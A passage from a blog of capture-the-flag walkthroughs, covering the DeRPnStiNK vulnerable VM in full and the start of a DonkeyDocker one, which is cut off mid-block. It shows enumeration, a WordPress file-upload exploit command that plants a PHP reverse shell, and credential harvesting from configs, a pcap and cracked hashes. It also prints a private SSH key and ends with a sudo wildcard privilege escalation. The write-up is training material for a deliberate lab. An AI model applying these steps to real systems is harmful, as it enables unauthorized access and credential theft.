</span><span class='line'>22/tcp open  ssh     OpenSSH 6.6.1p1 Ubuntu 2ubuntu2.8 (Ubuntu Linux; protocol 2.0)
</span><span class='line'>| ssh-hostkey:
</span><span class='line'>|   1024 12:4e:f8:6e:7b:6c:c6:d8:7c:d8:29:77:d1:0b:eb:72 (DSA)
</span><span class='line'>|   2048 72:c5:1c:5f:81:7b:dd:1a:fb:2e:59:67:fe:a6:91:2f (RSA)
</span><span class='line'>|   256 06:77:0f:4b:96:0a:3a:2c:3b:f0:8c:2b:57:b5:97:bc (ECDSA)
</span><span class='line'>|_  256 28:e8:ed:7c:60:7f:19:6c:e3:24:79:31:ca:ab:5d:2d (ED25519)
</span><span class='line'>80/tcp open  http    Apache httpd 2.4.7 ((Ubuntu))
</span><span class='line'>| http-robots.txt: 2 disallowed entries
</span><span class='line'>|_/php/ /temporary/
</span><span class='line'>|_http-server-header: Apache/2.4.7 (Ubuntu)
</span><span class='line'>|_http-title: DeRPnStiNK</span></code></pre></td></tr></table></div></figure>


<p>Not too many ports to play with. No available exploit for the FTP. The web server seems unfinished:</p>

<p><img class="center" src="http://chousensha.github.io/images/pentest/derpnstink/derpnstink.png" title="derpnstink" alt="derpnstink"></p>

<p>Let&rsquo;s check the robots.txt entries. The php folder gives a Forbidden error and the temporary one just displays a try harder! message. I ran gobuster on the web server and found a couple more entries. The interesting one was a <em>/weblog</em> folder:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>/weblog (Status: 301)</span></code></pre></td></tr></table></div></figure>


<p>When I hit that in the browser, it gave me a connection error, but for the derpnstink.local domain. So I added that to my /etc/hosts file and then I was able to connect:</p>

<p><img class="center" src="http://chousensha.github.io/images/pentest/derpnstink/weblog.png" title="weblog" alt="weblog"></p>

<p>This is a Wordpress site, so I ran a Wordpress scanner on it and the interesting findings were:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>[!] Title: WordPress 3.7-5.0 (except 4.9.9) - Authenticated Code Execution
</span><span class='line'> |     Fixed in: 5.0.1
</span><span class='line'> |     References:
</span><span class='line'> |      - https://wpvulndb.com/vulnerabilities/9222
</span><span class='line'> |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-8942
</span><span class='line'> |      - https://blog.ripstech.com/2019/wordpress-image-remote-code-execution/
</span><span class='line'>
</span><span class='line'> [!] Title: Slideshow Gallery &lt; 1.4.7 Arbitrary File Upload
</span><span class='line'>  |     Fixed in: 1.4.7
</span><span class='line'>  |     References:
</span><span class='line'>  |      - https://wpvulndb.com/vulnerabilities/7532
</span><span class='line'>  |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-5460
</span><span class='line'>  |      - https://www.exploit-db.com/exploits/34681/
</span><span class='line'>  |      - https://www.exploit-db.com/exploits/34514/
</span><span class='line'>  |      - http://seclists.org/bugtraq/2014/Sep/1
</span><span class='line'>  |      - http://packetstormsecurity.com/files/131526/
</span><span class='line'>  |      - https://www.rapid7.com/db/modules/exploit/unix/webapp/wp_slideshowgallery_upload</span></code></pre></td></tr></table></div></figure>


<p>It seems not much can be done without authentication, so I went to wp-admin and enumerated the username <em>admin</em> as a valid user&hellip;and in the process also discovered that the password is <em>admin</em>..derp! Now I could use an <a href="https://www.exploit-db.com/exploits/34681">exploit for the authenticated arbitrary file upload</a> with <code>python gallery.py -t <a href="http://derpnstink.local/weblog/">http://derpnstink.local/weblog/</a> -f ~/Desktop/php-reverse-shell.php -u admin -p admin</code>, and you can find the uploaded shell at <a href="http://derpnstink.local/weblog//wp-content/uploads/slideshow-gallery/php-reverse-shell.php">http://derpnstink.local/weblog//wp-content/uploads/slideshow-gallery/php-reverse-shell.php</a></p>

<p>From your new shell, if you look inside <code>/var/www/html/weblog/wp-config.php</code>, you can find the MySQL credentials:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>/** The name of the database for WordPress */
</span><span class='line'>define('DB_NAME', 'wordpress');
</span><span class='line'>
</span><span class='line'>/** MySQL database username */
</span><span class='line'>define('DB_USER', 'root');
</span><span class='line'>
</span><span class='line'>/** MySQL database password */
</span><span class='line'>define('DB_PASSWORD', 'mysql');
</span><span class='line'>
</span><span class='line'>/** MySQL hostname */
</span><span class='line'>define('DB_HOST', 'localhost');</span></code></pre></td></tr></table></div></figure>


<p>Inside <code>/var/www/html/php/info.php</code> there is a line stating that there&rsquo;s a PHPMyAdmin interface:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>/* management interface can be found at /phpmyadmin</span></code></pre></td></tr></table></div></figure>


<p>I went to <a href="http://derpnstink.local/php/phpmyadmin/">http://derpnstink.local/php/phpmyadmin/</a> and used the credentials to get in the wordpress database and get 2 users and hashes:</p>

<p><img class="center" src="http://chousensha.github.io/images/pentest/derpnstink/users.png" title="users" alt="users"></p>

<p>We already know the admin credentials, so I used john and the rockyou.txt wordlist to crack the hash and get the password <em>wedgie57</em> for user <em>unclestinky</em>. My first move was to try SSH&#8217;ing in, but public key authentication was configured. That left the FTP, and I was able to log in with the credentials <em>stinky</em>:<em>wedgie57</em> (there was no unclestinky user configured on the system)</p>

<p>On the FTP, we find a folder with some files that I downloaded on my machine for a better look: <code>wget -r <a href="ftp://derpnstink.local/files">ftp://derpnstink.local/files</a> &mdash;ftp-user=stinky &mdash;ftp-password=wedgie57</code></p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>ftp&gt; dir
</span><span class='line'>200 PORT command successful. Consider using PASV.
</span><span class='line'>150 Here comes the directory listing.
</span><span class='line'>drwxr-xr-x    5 1001     1001         4096 Nov 12  2017 files
</span><span class='line'>226 Directory send OK.
</span><span class='line'>ftp&gt; ls files
</span><span class='line'>200 PORT command successful. Consider using PASV.
</span><span class='line'>150 Here comes the directory listing.
</span><span class='line'>drwxr-xr-x    2 1001     1001         4096 Nov 12  2017 network-logs
</span><span class='line'>drwxr-xr-x    3 1001     1001         4096 Nov 12  2017 ssh
</span><span class='line'>-rwxr-xr-x    1 0        0              17 Nov 12  2017 test.txt
</span><span class='line'>drwxr-xr-x    2 0        0            4096 Nov 12  2017 tmp</span></code></pre></td></tr></table></div></figure>


<p>Inside network-logs there&rsquo;s a file that hints at some PCAP analysis:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>cat derpissues.txt
</span><span class='line'>12:06 mrderp: hey i cant login to wordpress anymore. Can you look into it?
</span><span class='line'>12:07 stinky: yeah. did you need a password reset?
</span><span class='line'>12:07 mrderp: I think i accidently deleted my account
</span><span class='line'>12:07 mrderp: i just need to logon once to make a change
</span><span class='line'>12:07 stinky: im gonna packet capture so we can figure out whats going on
</span><span class='line'>12:07 mrderp: that seems a bit overkill, but wtv
</span><span class='line'>12:08 stinky: commence the sniffer!!!!
</span><span class='line'>12:08 mrderp: -_-
</span><span class='line'>12:10 stinky: fine derp, i think i fixed it for you though. cany you try to login?
</span><span class='line'>12:11 mrderp: awesome it works!
</span><span class='line'>12:12 stinky: we really are the best sysadmins #team
</span><span class='line'>12:13 mrderp: i guess we are...
</span><span class='line'>12:15 mrderp: alright I made the changes, feel free to decomission my account
</span><span class='line'>12:20 stinky: done! yay</span></code></pre></td></tr></table></div></figure>


<p>Inside <em>/files/ssh/ssh/ssh/ssh/ssh/ssh/ssh</em> there&rsquo;s a private key:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>cat key.txt
</span><span class='line'>-----BEGIN RSA PRIVATE KEY-----
</span><span class='line'>MIIEowIBAAKCAQEAwSaN1OE76mjt64fOpAbKnFyikjz4yV8qYUxki+MjiRPqtDo4
</span><span class='line'>2xba3Oo78y82svuAHBm6YScUos8dHUCTMLA+ogsmoDaJFghZEtQXugP8flgSk9cO
</span><span class='line'>uJzOt9ih/MPmkjzfvDL9oW2Nh1XIctVfTZ6o8ZeJI8Sxh8Eguh+dw69M+Ad0Dimn
</span><span class='line'>AKDPdL7z7SeWg1BJ1q/oIAtJnv7yJz2iMbZ6xOj6/ZDE/2trrrdbSyMc5CyA09/f
</span><span class='line'>5xZ9f1ofSYhiCQ+dp9CTgH/JpKmdsZ21Uus8cbeGk1WpT6B+D8zoNgRxmO3/VyVB
</span><span class='line'>LHXaio3hmxshttdFp4bFc3foTTSyJobGoFX+ewIDAQABAoIBACESDdS2H8EZ6Cqc
</span><span class='line'>nRfehdBR2A/72oj3/1SbdNeys0HkJBppoZR5jE2o2Uzg95ebkiq9iPjbbSAXICAD
</span><span class='line'>D3CVrJOoHxvtWnloQoADynAyAIhNYhjoCIA5cPdvYwTZMeA2BgS+IkkCbeoPGPv4
</span><span class='line'>ZpHuqXR8AqIaKl9ZBNZ5VVTM7fvFVl5afN5eWIZlOTDf++VSDedtR7nL2ggzacNk
</span><span class='line'>Q8JCK9mF62wiIHK5Zjs1lns4Ii2kPw+qObdYoaiFnexucvkMSFD7VAdfFUECQIyq
</span><span class='line'>YVbsp5tec2N4HdhK/B0V8D4+6u9OuoiDFqbdJJWLFQ55e6kspIWQxM/j6PRGQhL0
</span><span class='line'>DeZCLQECgYEA9qUoeblEro6ICqvcrye0ram38XmxAhVIPM7g5QXh58YdB1D6sq6X
</span><span class='line'>VGGEaLxypnUbbDnJQ92Do0AtvqCTBx4VnoMNisce++7IyfTSygbZR8LscZQ51ciu
</span><span class='line'>Qkowz3yp8XMyMw+YkEV5nAw9a4puiecg79rH9WSr4A/XMwHcJ2swloECgYEAyHn7
</span><span class='line'>VNG/Nrc4/yeTqfrxzDBdHm+y9nowlWL+PQim9z+j78tlWX/9P8h98gOlADEvOZvc
</span><span class='line'>fh1eW0gE4DDyRBeYetBytFc0kzZbcQtd7042/oPmpbW55lzKBnnXkO3BI2bgU9Br
</span><span class='line'>7QTsJlcUybZ0MVwgs+Go1Xj7PRisxMSRx8mHbvsCgYBxyLulfBz9Um/cTHDgtTab
</span><span class='line'>L0LWucc5KMxMkTwbK92N6U2XBHrDV9wkZ2CIWPejZz8hbH83Ocfy1jbETJvHms9q
</span><span class='line'>cxcaQMZAf2ZOFQ3xebtfacNemn0b7RrHJibicaaM5xHvkHBXjlWN8e+b3x8jq2b8
</span><span class='line'>gDfjM3A/S8+Bjogb/01JAQKBgGfUvbY9eBKHrO6B+fnEre06c1ArO/5qZLVKczD7
</span><span class='line'>RTazcF3m81P6dRjO52QsPQ4vay0kK3vqDA+s6lGPKDraGbAqO+5paCKCubN/1qP1
</span><span class='line'>14fUmuXijCjikAPwoRQ//5MtWiwuu2cj8Ice/PZIGD/kXk+sJXyCz2TiXcD/qh1W
</span><span class='line'>pF13AoGBAJG43weOx9gyy1Bo64cBtZ7iPJ9doiZ5Y6UWYNxy3/f2wZ37D99NSndz
</span><span class='line'>UBtPqkw0sAptqkjKeNtLCYtHNFJAnE0/uAGoAyX+SHhas0l2IYlUlk8AttcHP1kA
</span><span class='line'>a4Id4FlCiJAXl3/ayyrUghuWWA3jMW3JgZdMyhU3OV+wyZz25S8o
</span><span class='line'>-----END RSA PRIVATE KEY-----</span></code></pre></td></tr></table></div></figure>


<p>Now we can SSH on the box:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>ssh -i stinky_key stinky@derpnstink.local
</span><span class='line'>Ubuntu 14.04.5 LTS
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>                       ,~~~~~~~~~~~~~..
</span><span class='line'>                       '  Derrrrrp  N  `
</span><span class='line'>        ,~~~~~~,       |    Stink      |
</span><span class='line'>       / ,      \      ',  ________ _,"
</span><span class='line'>      /,~|_______\.      \/
</span><span class='line'>     /~ (__________)
</span><span class='line'>    (*)  ; (^)(^)':
</span><span class='line'>        =;  ____  ;
</span><span class='line'>          ; """"  ;=
</span><span class='line'>   {"}_   ' '""' ' _{"}
</span><span class='line'>   \__/     &gt;  &lt;   \__/
</span><span class='line'>      \    ,"   ",  /
</span><span class='line'>       \  "       /"
</span><span class='line'>          "      "=
</span><span class='line'>           &gt;     &lt;
</span><span class='line'>          ="     "-
</span><span class='line'>          -`.   ,'
</span><span class='line'>                -
</span><span class='line'>            `--'
</span><span class='line'>
</span><span class='line'>Welcome to Ubuntu 14.04.5 LTS (GNU/Linux 4.4.0-31-generic i686)
</span><span class='line'>
</span><span class='line'> * Documentation:  https://help.ubuntu.com/
</span><span class='line'>
</span><span class='line'>331 packages can be updated.
</span><span class='line'>231 updates are security updates.
</span><span class='line'>
</span><span class='line'>Last login: Mon Nov 13 00:31:29 2017 from 192.168.1.129
</span><span class='line'>stinky@DeRPnStiNK:~$</span></code></pre></td></tr></table></div></figure>


<p>Inside Documents there&rsquo;s the derpissues.pcap file. I ran <code>strings derpissues.pcap | grep pass</code> on it to get another set of credentials:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>user_login=mrderp
</span><span class='line'>pass1=derpderpderpderpderpderpderp</span></code></pre></td></tr></table></div></figure>


<p>In the /etc/passwd file we can find a mrderp user, so I tried to SSH and got in. On the Desktop, I found a file with a helpdesk ticket about sudo issues:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
<span class='line-number'>47</span>
<span class='line-number'>48</span>
<span class='line-number'>49</span>
<span class='line-number'>50</span>
<span class='line-number'>51</span>
<span class='line-number'>52</span>
<span class='line-number'>53</span>
<span class='line-number'>54</span>
<span class='line-number'>55</span>
<span class='line-number'>56</span>
<span class='line-number'>57</span>
<span class='line-number'>58</span>
<span class='line-number'>59</span>
<span class='line-number'>60</span>
<span class='line-number'>61</span>
<span class='line-number'>62</span>
<span class='line-number'>63</span>
<span class='line-number'>64</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>mrderp@DeRPnStiNK:~$ cat Desktop/helpdesk.log
</span><span class='line'>From: Help Desk &lt;helpdesk@derpnstink.local&gt;
</span><span class='line'>Date: Thu, Aug 23, 2017 at 1:29 PM
</span><span class='line'>Subject: sudoers ISSUE=242 PROJ=26
</span><span class='line'>To: Derp, Mr (mrderp) [C]
</span><span class='line'>When replying, type your text above this line.
</span><span class='line'>
</span><span class='line'>Help Desk Ticket Notification
</span><span class='line'>Thank you for contacting the Help Desk. Your ticket information is below. If you have any
</span><span class='line'>additional information to add to this ticket, please reply to this notification.
</span><span class='line'>If you need immediate help (i.e. you are within two days of a deadline or in the event of a
</span><span class='line'>security emergency), call us. Note that the Help Desk's busiest hours are between 10 a.m. (ET)
</span><span class='line'>and 3 p.m. (ET).
</span><span class='line'>
</span><span class='line'>Toll-free: 1-866-504-9552
</span><span class='line'>Phone: 301-402-7469
</span><span class='line'>TTY: 301-451-5939
</span><span class='line'>Ticket Title: Sudoers File issues
</span><span class='line'>Ticket Number: 242
</span><span class='line'>Status: Break/fix
</span><span class='line'>Date Created: 08/23/2017
</span><span class='line'>Latest Update Date: 08/23/2017
</span><span class='line'>Contact Name: Mr Derp
</span><span class='line'>CC’s: Uncle Stinky
</span><span class='line'>Full description and latest notes on your Ticket: Sudoers File issues
</span><span class='line'>Notification
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>Regards,
</span><span class='line'>Service Desk
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>Listen with focus, answer with accuracy, assist with compassion.
</span><span class='line'>
</span><span class='line'>From: Help Desk
</span><span class='line'>Date: Mon, Sep 10, 2017 at 2:53 PM
</span><span class='line'>Subject: sudoers ISSUE=242 PROJ=26
</span><span class='line'>To: Derp, Mr (mrderp) [C]
</span><span class='line'>When replying, type your text above this line.
</span><span class='line'>
</span><span class='line'>Closed Ticket Notification
</span><span class='line'>
</span><span class='line'>Thank you for contacting the Help Desk. Your ticket information and its resolution is
</span><span class='line'>below. If you feel that the ticket has not been resolved to your satisfaction or you need additional
</span><span class='line'>assistance, please reply to this notification to provide additional information.
</span><span class='line'>If you need immediate help (i.e. you are within two days of a deadline or in the event of a
</span><span class='line'>security emergency), call us or visit our Self Help Web page at https://pastebin.com/RzK9WfGw
</span><span class='line'>Note that the Help Desk's busiest hours are between 10 a.m. (ET)
</span><span class='line'>and 3 p.m. (ET).
</span><span class='line'>Toll-free: 1-866-504-9552
</span><span class='line'>Phone: 301-402-7469
</span><span class='line'>TTY: 301-451-5939
</span><span class='line'>Ticket Title: sudoers issues
</span><span class='line'>Ticket Number: 242
</span><span class='line'>Status: Closed
</span><span class='line'>Date Created: 09/10/2017
</span><span class='line'>Latest Update Date: 09/10/2017
</span><span class='line'>CC’s:
</span><span class='line'>Resolution: Closing ticket. ticket notification.
</span><span class='line'>
</span><span class='line'>Regards,
</span><span class='line'>eRA Service Desk
</span><span class='line'>Listen with focus, answer with accuracy, assist with compassion.
</span><span class='line'>For more information, dont forget to visit the Self Help Web page!!!</span></code></pre></td></tr></table></div></figure>


<p>On the root filesystem, I found an interesting folder called /support with more information about this sudo issue:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>mrderp@DeRPnStiNK:~$ cat /support/troubleshooting.txt
</span><span class='line'>*******************************************************************
</span><span class='line'>On one particular machine I often need to run sudo commands every now and then. I am fine with entering password on sudo in most of the cases.
</span><span class='line'>
</span><span class='line'>However i dont want to specify each command to allow
</span><span class='line'>
</span><span class='line'>How can I exclude these commands from password protection to sudo?
</span><span class='line'>
</span><span class='line'>********************************************************************
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>********************************************************************
</span><span class='line'>Thank you for contacting the Client Support team. This message is to confirm that we have resolved and closed your ticket.
</span><span class='line'>
</span><span class='line'>Please contact the Client Support team at https://pastebin.com/RzK9WfGw if you have any further questions or issues.
</span><span class='line'>
</span><span class='line'>Thank you for using our product.
</span><span class='line'>
</span><span class='line'>********************************************************************</span></code></pre></td></tr></table></div></figure>


<p>Running a <strong>sudo -l</strong> gives us the sudo commands that mrderp can run:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>User mrderp may run the following commands on DeRPnStiNK:
</span><span class='line'>    (ALL) /home/mrderp/binaries/derpy*</span></code></pre></td></tr></table></div></figure>


<p>All I had to do at this point was to create a binaries directory, copy the bash executable to something with derpy in the name and run it as sudo:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>mrderp@DeRPnStiNK:~/binaries$ cp -p /bin/bash derpy.sh
</span><span class='line'>mrderp@DeRPnStiNK:~/binaries$ sudo ./derpy.sh
</span><span class='line'>[sudo] password for mrderp:
</span><span class='line'>root@DeRPnStiNK:~/binaries#</span></code></pre></td></tr></table></div></figure>


<p>Only at the end I realized I should have also collected flags, but I was too lazy to return to that, so leaving only the last flag here:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>root@DeRPnStiNK:/root# cat Desktop/flag.txt
</span><span class='line'>flag4(49dca65f362fee401292ed7ada96f96295eab1e589c52e4e66bf4aedda715fdd)
</span><span class='line'>
</span><span class='line'>Congrats on rooting my first VulnOS!
</span><span class='line'>
</span><span class='line'>Hit me up on twitter and let me know your thoughts!
</span><span class='line'>
</span><span class='line'>@securekomodo</span></code></pre></td></tr></table></div></figure>




<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>______________________________________
</span><span class='line'>/ You need more time; and you probably \
</span><span class='line'>\ always will.                         /
</span><span class='line'>--------------------------------------
</span><span class='line'>       \   ^__^
</span><span class='line'>        \  (oo)\_______
</span><span class='line'>           (__)\       )\/\
</span><span class='line'>               ||----w |
</span><span class='line'>               ||     ||</span></code></pre></td></tr></table></div></figure>



]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Donkey Docker]]></title>
    <link href="http://chousensha.github.io/blog/2019/04/15/donkey-docker/"/>
    <updated>2019-04-15T21:02:36+03:00</updated>
    <id>http://chousensha.github.io/blog/2019/04/15/donkey-docker</id>
    <content type="html"><![CDATA[<p>Today&rsquo;s target is called DonkeyDocker, so we should expect a Docker component! The level is intermediate to hard.</p>

<!-- more -->




<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>PORT   STATE SERVICE VERSION
</span><span class='line'>22/tcp open  ssh     OpenSSH 7.5 (protocol 2.0)
</span><span class='line'>| ssh-hostkey:
</span><span class='line'>|   2048 9c:38:ce:11:9c:b2:7a:48:58:c9:76:d5:b8:bd:bd:57 (RSA)
</span><span class='line'>|   256 d7:5e:f2:17:bd:18:1b:9c:8c:ab:11:09:e8:a0:00:c2 (ECDSA)
</span><span class='line'>|_  256 06:f0:0c:d8:bc:9b:21:95:a5:d2:70:39:08:57:b3:07 (ED25519)
</span><span class='line'>80/tcp open  http    Apache httpd 2.4.10 ((Debian))
</span><span class='line'>| http-robots.txt: 3 disallowed entries
</span><span class='line'>|_/contact.php /index.php /about.php
</span><span class='line'>|_http-server-header: Apache/2.4.10 (Debian)
</span><span class='line'>|_http-title: Docker Donkey</span></code></pre></td></tr></table></div></figure>


<p>Not much to work with, let&rsquo;s hit the web server first. Nothing interesting on the home page and the contact page d, but going to the about page gives an error that something went wrong.</p>

<p>In the HTML source, I found a comment:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class='html'><span class='line'><span class="c">&lt;!-- FIXME!: www-path: /www --&gt;</span>
</span></code></pre></td></tr></table></div></figure>


<p>Didn&rsquo;t find such a path with my enumeration. I fired up Gobuster next:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
</pre></td><td class='code'><pre><code class='html'><span class='line'>gobuster -u http://192.168.159.132/ -w /usr/share/wordlists/dirb/big.txt -q -t 20
</span><span class='line'>/.htpasswd (Status: 403)
</span><span class='line'>/.htaccess (Status: 403)
</span><span class='line'>/about (Status: 200)
</span><span class='line'>/assets (Status: 301)
</span><span class='line'>/contact (Status: 200)
</span><span class='line'>/css (Status: 301)
</span><span class='line'>/dist (Status: 301)
</span><span class='line'>/index (Status: 200)
</span><span class='line'>/mailer (Status: 301)
</span><span class='line'>/robots.txt (Status: 200)
</span><span class='line'>/server-status (Status: 403)
</span></code></pre></td></tr></table></div></figure>


<p>Trying those folders gave me 403 errors, so the next thing I did was to enumerate those folders themselves, and got an interesting hit with the /mailer folder:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
